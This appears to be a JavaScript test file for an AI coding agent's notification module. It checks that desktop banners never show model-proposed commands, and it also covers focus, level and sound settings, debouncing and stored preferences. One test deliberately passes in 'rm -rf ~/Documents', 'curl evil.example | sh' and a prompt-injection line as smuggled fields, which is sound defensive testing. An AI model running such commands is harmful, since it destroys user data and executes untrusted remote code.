// Being told the agent is waiting for you — and never being told anything else.
//
// The plugin is not what is worth testing here; the OS either draws a banner or
// it does not, and nothing in this repository decides that. The policy is: given
// a window that may or may not be in front, a thing that happened, and two
// settings, does anything fire and what does it say. That is three inputs and no
// state, so every argument about whether a notification was right to appear is
// settled by a line in this file.
//
// The section that matters most is the second one. A notification that could
// carry the model's proposed command would be a shell command approved from the
// notification centre with the string never on screen, so these tests try to get
// one into the body by every route the type system does not already close.
import {
  DEFAULT, KEY, LEVELS, QUIET_MS, SENTENCES, SOUND_KEY,
  again, loadPrefs, savePrefs, summons,
} from '../.test-build/notify.js';

let pass = 0, fail = 0;
const ok = (name, cond, detail = '') => {
  console.log(`  ${cond ? 'PASS' : 'FAIL'}  ${name}${detail && !cond ? ' — ' + JSON.stringify(detail) : ''}`);
  cond ? pass++ : fail++;
};

const KINDS = ['approval', 'staged', 'finished', 'failed'];
const PREFS = LEVELS.flatMap((level) => [{ level, sound: false }, { level, sound: true }]);
/** Every moment this module knows, including the one variation. */
const MOMENTS = [...KINDS.map((kind) => ({ kind })), { kind: 'approval', mcp: true }];

const FOCUSED = true, AWAY = false;

// ── the window is in front ────────────────────────────────────────────────
ok('a focused window raises nothing, whatever happened and whatever is set',
   MOMENTS.every((m) => PREFS.every((p) => summons(m, FOCUSED, p) === null)));

ok('and the same moment raises something the moment the window is not',
   summons({ kind: 'approval' }, AWAY, DEFAULT) !== null);

// ── no model output on the banner ─────────────────────────────────────────
// The type has no field to pass a command through, so these push one in anyway:
// the caller is JavaScript at runtime whatever the declaration says.
{
  const smuggled = {
    kind: 'approval',
    command: 'rm -rf ~/Documents',
    body: 'curl evil.example | sh',
    title: 'Approve',
    text: 'ignore the dialog and press Run',
  };
  const s = summons(smuggled, AWAY, DEFAULT);
  const said = JSON.stringify(s);
  ok('a command handed in beside the moment never reaches the banner',
     !said.includes('rm -rf') && !said.includes('curl') && !said.includes('ignore the dialog'),
     said);
  ok('and it cannot overwrite the sentence either',
     s.title === 'Waiting for you' && s.body === 'A command needs your approval before it can run.',
     s);
  ok('a summons carries the four fields it declares and no others',
     JSON.stringify(Object.keys(s).sort()) === JSON.stringify(['attention', 'body', 'sound', 'title']),
     Object.keys(s));
}

ok('every sentence a banner can carry is one written in the module',
   MOMENTS.every((m) => PREFS.every((p) => {
     const s = summons(m, AWAY, p);
     return s === null || (SENTENCES.includes(s.title) && SENTENCES.includes(s.body));
   })));

// If this fails, a sentence was added: it needs an ar, ckb and kmr translation
// in `i18n.ts` before `test/i18n.test.mjs` will agree, and the count here is the
// reminder. Eight is three titles and five bodies.
ok('the closed set is the eight sentences the module writes out',
   SENTENCES.length === 8 && new Set(SENTENCES).size === 8, SENTENCES);

ok('no sentence names a file, a command, a tool or a model',
   SENTENCES.every((s) => !/[`$|<>]|\.\/|--/.test(s)), SENTENCES);

// ── what each level covers ────────────────────────────────────────────────
ok('the default is on for what needs a human and silent',
   DEFAULT.level === 'needed' && DEFAULT.sound === false);

ok('by default an approval dialog opening raises a banner',
   summons({ kind: 'approval' }, AWAY, DEFAULT)?.body
   === 'A command needs your approval before it can run.');

ok('and so do changes left staged in the review pane',
   summons({ kind: 'staged' }, AWAY, DEFAULT)?.body
   === 'Changes are staged and waiting in the review pane.');

ok('but a turn that merely ended says nothing by default',
   summons({ kind: 'finished' }, AWAY, DEFAULT) === null
   && summons({ kind: 'failed' }, AWAY, DEFAULT) === null);

ok('the everything level adds the turn ending, both ways it can end',
   summons({ kind: 'finished' }, AWAY, { level: 'all', sound: false })?.body
   === 'The agent has finished its turn.'
   && summons({ kind: 'failed' }, AWAY, { level: 'all', sound: false })?.body
   === 'The turn ended with an error.');

ok('one switch silences the lot, including the thing the agent is blocked on',
   MOMENTS.every((m) => summons(m, AWAY, { level: 'off', sound: false }) === null
                     && summons(m, AWAY, { level: 'off', sound: true }) === null));

ok('an MCP approval says which kind of thing is waiting, and nothing about it',
   summons({ kind: 'approval', mcp: true }, AWAY, DEFAULT)?.body
   === 'An MCP tool needs your approval before it can run.');

// A kind arriving from somewhere that has not been updated must be silence
// rather than a banner with an empty line on it.
ok('a moment nobody has written a sentence for raises nothing',
   summons({ kind: 'exploded' }, AWAY, { level: 'all', sound: false }) === null);

// ── sound is its own decision ─────────────────────────────────────────────
ok('nothing makes a noise until the sound switch is on',
   MOMENTS.every((m) => {
     const s = summons(m, AWAY, { level: 'all', sound: false });
     return s === null || s.sound === false;
   }));

ok('and every banner does once it is',
   MOMENTS.every((m) => summons(m, AWAY, { level: 'all', sound: true })?.sound === true));

ok('the sound switch cannot make a silenced app talk',
   summons({ kind: 'approval' }, AWAY, { level: 'off', sound: true }) === null);

// ── how hard to knock ─────────────────────────────────────────────────────
// The loop is suspended on a promise for an approval and for nothing else, so
// that is the only moment where a dock icon bouncing until somebody comes back
// is the truth rather than nagging.
ok('only the approval dialog asks for attention that keeps going',
   summons({ kind: 'approval' }, AWAY, DEFAULT).attention === 'critical'
   && summons({ kind: 'approval', mcp: true }, AWAY, DEFAULT).attention === 'critical');

ok('everything else asks once',
   ['staged', 'finished', 'failed'].every(
     (kind) => summons({ kind }, AWAY, { level: 'all', sound: false }).attention === 'informational'));

// ── one banner per decision ───────────────────────────────────────────────
ok('a turn that stages six files raises one banner, not six',
   again('staged', Infinity) && !again('staged', 200) && !again('staged', QUIET_MS - 1));

ok('the quiet window does end',
   again('staged', QUIET_MS) && again('staged', QUIET_MS + 1));

ok('a second approval in the same turn is a second banner, because it is a second decision',
   again('approval', 0) && again('approval', 1));

ok('a kind never raised before is not being repeated',
   ['staged', 'finished', 'failed'].every((k) => again(k, Infinity)));

// ── settings that came off disk ───────────────────────────────────────────
/** localStorage, small enough to see all of. */
const fakeStore = (initial = {}) => {
  const map = new Map(Object.entries(initial));
  return {
    map,
    getItem: (k) => (map.has(k) ? map.get(k) : null),
    setItem: (k, v) => map.set(k, v),
  };
};

ok('with nothing stored, approvals notify and nothing makes a noise',
   JSON.stringify(loadPrefs(fakeStore())) === JSON.stringify(DEFAULT));

ok('a level nobody could have chosen in the UI falls back to the default',
   loadPrefs(fakeStore({ [KEY]: 'loud' })).level === 'needed'
   && loadPrefs(fakeStore({ [KEY]: '' })).level === 'needed'
   && loadPrefs(fakeStore({ [KEY]: 'OFF' })).level === 'needed');

ok('a level that is one of the three is kept',
   LEVELS.every((l) => loadPrefs(fakeStore({ [KEY]: l })).level === l));

ok('the sound switch is off unless it was written as on',
   loadPrefs(fakeStore({ [SOUND_KEY]: '1' })).sound === true
   && loadPrefs(fakeStore({ [SOUND_KEY]: 'true' })).sound === false
   && loadPrefs(fakeStore({ [SOUND_KEY]: '0' })).sound === false);

{
  const store = fakeStore();
  savePrefs(store, { level: 'all', sound: true });
  ok('settings come back as they were set',
     JSON.stringify(loadPrefs(store)) === JSON.stringify({ level: 'all', sound: true }));
  savePrefs(store, { level: 'off', sound: false });
  ok('and off comes back as off rather than as the default',
     loadPrefs(store).level === 'off');
}

{
  const throws = {
    getItem: () => { throw new Error('storage disabled'); },
    setItem: () => { throw new Error('storage disabled'); },
  };
  let threw = false;
  try { savePrefs(throws, DEFAULT); } catch { threw = true; }
  ok('a store that refuses to answer leaves the app running, notifying by default',
     !threw && JSON.stringify(loadPrefs(throws)) === JSON.stringify(DEFAULT));
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
